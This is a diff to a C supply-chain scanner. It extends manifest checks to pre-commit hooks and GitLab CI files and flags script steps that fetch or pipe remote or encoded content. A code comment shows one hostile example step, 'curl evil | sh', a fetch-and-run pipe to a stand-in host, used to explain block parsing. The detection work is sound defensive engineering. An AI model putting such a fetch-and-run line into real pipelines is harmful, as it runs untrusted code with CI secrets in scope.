@@ -1079,7 +1079,8 @@ hlse_cmd_package(const HlseCli *o, int argc, char **argv, int idx) {
             FILE *mf;
             char line[4096];
             int in_deps = 0, checked = 0, threats = 0, gate_hits = 0;
-            int max_score = 0, lineno = 0, run_blk = -1, prt_seen = 0;
+            int max_score = 0, lineno = 0, run_blk = -1, prt_seen = 0,
+                glci_blk = -1;
             if (argc < idx + 3) {
                 fprintf(stderr, "Usage: %s package --manifest <file> [eco]\n",
                         argv[0]);
@@ -1089,7 +1090,7 @@ hlse_cmd_package(const HlseCli *o, int argc, char **argv, int idx) {
             eco = (argc > idx + 3) ? argv[idx + 3] : hlse_manifest_ecosystem(mpath);
             if (!eco) {
                 fprintf(stderr, "Error: cannot infer ecosystem from '%s' \xe2\x80\x94 "
-                        "pass one explicitly (pip|npm|cargo|go|gem|docker|gha|mcp|devc|vsc)\n", mpath);
+                        "pass one explicitly (pip|npm|cargo|go|gem|docker|gha|mcp|devc|vsc|pck|glci)\n", mpath);
                 return 2;
             }
             mf = fopen(mpath, "r");
@@ -1754,18 +1755,62 @@ hlse_cmd_package(const HlseCli *o, int argc, char **argv, int idx) {
                         }
                     }
                 }
-                /* Repo-supplied IDE automation: devcontainer
-                 * lifecycle commands and .vscode folderOpen tasks /
-                 * binary-path settings execute when a reviewer opens
-                 * or trusts the workspace. */
+                /* Repo-supplied IDE automation + CI/Hook configs:
+                 * devcontainer lifecycle commands, .vscode
+                 * folderOpen tasks / binary-path settings, local
+                 * pre-commit hooks, gitlab-ci remote includes —
+                 * all execute when a reviewer opens, trusts, or
+                 * commits in the workspace. */
                 if (strcmp(eco, "devc") == 0 ||
-                    strcmp(eco, "vsc") == 0) {
+                    strcmp(eco, "vsc") == 0 ||
+                    strcmp(eco, "pck") == 0 ||
+                    strcmp(eco, "glci") == 0) {
                     char xreason[HLSE_HOOK_REASON_LEN];
-                    int xsc = (eco[0] == 'd')
-                        ? hlse_manifest_devc_risk(line, xreason,
-                                                  sizeof(xreason))
-                        : hlse_manifest_vsc_risk(line, xreason,
-                                                 sizeof(xreason));
+                    int xsc;
+                    if (strcmp(eco, "devc") == 0)
+                        xsc = hlse_manifest_devc_risk(line, xreason,
+                                                      sizeof(xreason));
+                    else if (strcmp(eco, "vsc") == 0)
+                        xsc = hlse_manifest_vsc_risk(line, xreason,
+                                                     sizeof(xreason));
+                    else if (strcmp(eco, "pck") == 0)
+                        xsc = hlse_manifest_pck_risk(line, xreason,
+                                                     sizeof(xreason));
+                    else {
+                        /* gitlab-ci script steps are block lists:
+                         *   script:
+                         *     - curl evil | sh
+                         * glci_blk tracks the key's indent so the
+                         * `- cmd` body lines count as script. */
+                        int indent = 0, is_key = 0, blank;
+                        const char *p;
+                        while (line[indent] == ' ') indent++;
+                        p = line + indent;
+                        blank = (*p == '\n' || *p == '\0');
+                        if (!blank &&
+                            (strncmp(p, "script:", 7) == 0 ||
+                             strncmp(p, "before_script:", 14) == 0 ||
+                             strncmp(p, "after_script:", 13) == 0 ||
+                             strncmp(p, "pre_get_sources_script:", 23) == 0))
+                            is_key = 1;
+                        if (is_key) {
+                            glci_blk = indent;   /* body lines follow */
+                        } else if (glci_blk >= 0 && !blank &&
+                                   indent <= glci_blk) {
+                            glci_blk = -1;
+                        }
+                        xsc = hlse_manifest_glci_risk(line, xreason,
+                                                      sizeof(xreason));
+                        if (!xsc && glci_blk >= 0 &&
+                            (indent > glci_blk || blank) &&
+                            hlse_manifest_execish(line)) {
+                            xsc = 55;
+                            snprintf(xreason, sizeof(xreason),
+                                "gitlab-ci script block step fetches/"
+                                "pipes remote or encoded content — "
+                                "executes with CI variable scope");
+                        }
+                    }
                     if (xsc) {
                         threats++;
                         hlse_alert_emit_rows("package", xsc,
@@ -1776,7 +1821,9 @@ hlse_cmd_package(const HlseCli *o, int argc, char **argv, int idx) {
                         if (o->sarif_out) {
                             hlse_sarif_add(mpath, lineno,
                                 eco[0] == 'd' ? "package-devcontainer"
-                                              : "package-vscode",
+                                : eco[0] == 'v' ? "package-vscode"
+                                : eco[0] == 'p' ? "package-precommit"
+                                              : "package-gitlabcicd",
                                 "HLSE-PKG-IDEEXEC", xreason, xsc);
                         } else if (o->json_out) {
                             char exr[384];
